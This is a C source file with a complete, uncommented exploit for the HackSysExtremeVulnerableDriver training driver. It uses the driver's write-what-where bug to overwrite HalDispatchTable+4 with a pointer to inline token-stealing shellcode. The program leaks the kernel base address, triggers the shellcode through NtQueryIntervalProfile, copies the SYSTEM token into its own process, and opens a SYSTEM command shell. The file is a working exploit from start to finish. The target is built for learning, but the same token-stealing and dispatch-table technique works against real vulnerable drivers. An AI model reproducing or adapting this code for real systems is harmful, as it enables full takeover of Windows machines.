#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#define KTHREAD_OFFSET          0x124
#define KPROCESS_OFFSET         0x050
#define FLINK_OFFSET            0x0b8
#define PID_OFFSET              0x0b4
#define TOKEN_OFFSET            0x0f8
#define SYSTEM_PID              0x004
#define SysModuleInfoCall       0x00b
#define CASE_ID			            0x22200B

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength);

typedef NTSTATUS(WINAPI* pNtQueryIntervalProfile)(
	IN ULONG ProfileSource,
	OUT PULONG Interval);

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	PVOID  Unknown1;
	PVOID  Unknown2;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

void ErrorOutput(const char* msg)
{
	printf(msg);
	printf("[-] Error Code: %d\n", GetLastError());
	exit(1);
}

PVOID GetHalTable()
{
	HMODULE hNtDll = LoadLibraryA("ntdll.dll");
	if (!hNtDll)
	{
		ErrorOutput("[-] Failed To Load The Ntdll.dll\n");
	}

	pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		ErrorOutput("[-] Failed To Get NtQuerySystemInformation's Address\n");
	}
	else
	{
		printf("[+] NtQuerySystemInformation's Address: 0x%x\n", (DWORD)NtQuerySystemInformation);
	}

	ULONG bufLength = 0;
	NtQuerySystemInformation(SysModuleInfoCall, NULL, 0, &bufLength);
	PSYSTEM_MODULE_INFORMATION sysModuleInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufLength);
	if (!sysModuleInfo)
	{
		ErrorOutput("[-] Failed To Alloc A Chunk For SYSTEM_MODULE_INFORMATION\n");
	}

	NTSTATUS status = NtQuerySystemInformation(SysModuleInfoCall, sysModuleInfo, bufLength, &bufLength);
	if (!NT_SUCCESS(status))
	{
		ErrorOutput("[-] Failed To Get SYSTEM_MODULE_INFORMATION\n");
	}

	PVOID kernelBaseAddr = sysModuleInfo->Module[0].Base;
	PCHAR kernelImage = sysModuleInfo->Module[0].ImageName;
	kernelImage = strrchr(kernelImage, '\\') + 1;
	printf("[+] Kernel Module: %s\n", kernelImage);
	printf("[+] Kernel Base_address: 0x%x\n", (DWORD)kernelBaseAddr);

	HMODULE hKernel2User = LoadLibraryA(kernelImage);
	if (!hKernel2User)
	{
		printf("[-] Failed To Load %s, Error Code: %d\n", kernelImage, GetLastError());
		exit(1);
	}

	PVOID hHalDispatchTable = (PVOID)GetProcAddress(hKernel2User, "HalDispatchTable");
	if (!hHalDispatchTable)
	{
		ErrorOutput("[-] Failed To Get The HalDispatchTable's Address\n");
	}

	PVOID halDispatchTableAddr = (ULONG)hHalDispatchTable - (ULONG)hKernel2User + (ULONG)kernelBaseAddr;
	printf("[+] HalDispatchTable Address: 0x%x\n", (DWORD)halDispatchTableAddr);

	HeapFree(GetProcessHeap(), 0, sysModuleInfo);
	FreeLibrary(hNtDll);
	FreeLibrary(hKernel2User);
	hNtDll = NULL;
	NtQuerySystemInformation = NULL;
	sysModuleInfo = NULL;
	return halDispatchTableAddr;
}

pNtQueryIntervalProfile GetTargetFunction()
{
	HMODULE hNtDll = LoadLibraryA("ntdll.dll");
	if (!hNtDll)
	{
		ErrorOutput("[-] Failed To Load Ntdll.dll\n");
	}
	pNtQueryIntervalProfile NtQueryIntervalProfile = (pNtQueryIntervalProfile)GetProcAddress(hNtDll, "NtQueryIntervalProfile");
	if (!NtQueryIntervalProfile)
	{
		ErrorOutput("[-] Failed To Get NtQueryIntervalProfile's Address\n");
	}

	printf("[+] NtQueryIntervalProfile's Address: 0x%x\n", (DWORD)NtQueryIntervalProfile);
	return NtQueryIntervalProfile;
}

void StealTokenShellcode()
{
	__asm
	{
		pushad;

		mov eax, fs: [KTHREAD_OFFSET] ;
		mov eax, [eax + KPROCESS_OFFSET];
		mov ecx, eax;

	find_sytem_pid:
		mov ecx, [ecx + FLINK_OFFSET];
		sub ecx, FLINK_OFFSET;
		mov edx, [ecx + PID_OFFSET];
		cmp edx, SYSTEM_PID;
		jnz find_sytem_pid;

		mov edx, [ecx + TOKEN_OFFSET];
		mov[eax + TOKEN_OFFSET], edx;

		popad;
		add esp, 0xc;
		ret;
	}
}

void CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_WRITE | GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		0);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		ErrorOutput("[-] Failed To Open The File\n");
	}
	printf("[+] Driver Handle: %d\n", (DWORD)hDevice);

	PVOID halDispatchTableAddrPlus4 = (PVOID)((ULONG)GetHalTable() + 4);
	PULONG shellcodeTransit = (PULONG)StealTokenShellcode;
	WRITE_WHAT_WHERE www;
	www.What = (PULONG_PTR)&shellcodeTransit;
	www.Where = (PULONG_PTR)halDispatchTableAddrPlus4;
	printf("[+] HalDispatchTableAddrPlus4's Address: 0x%x\n", (DWORD)halDispatchTableAddrPlus4);
	printf("[+] Www's address: 0x%x\n", (DWORD)&www);
	printf("[+] Www.What: 0x%x\n", (DWORD)www.What);
	printf("[+] Www.Where: 0x%x\n", (DWORD)www.Where);

	ULONG retLength = 0;
	BOOL ret = DeviceIoControl(hDevice,
		CASE_ID,
		&www,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&retLength,
		NULL);
	if (!ret)
	{
		ErrorOutput("Failed To Send Message\n");
	}

	pNtQueryIntervalProfile NtQueryIntervalProfile = GetTargetFunction();
	ULONG interval = 0;
	NtQueryIntervalProfile(0x1337, &interval);
	printf("[+] Time To Get Shell\n");
	CloseHandle(hDevice);
	CreateCmd();
	system("pause");
	return 0;
}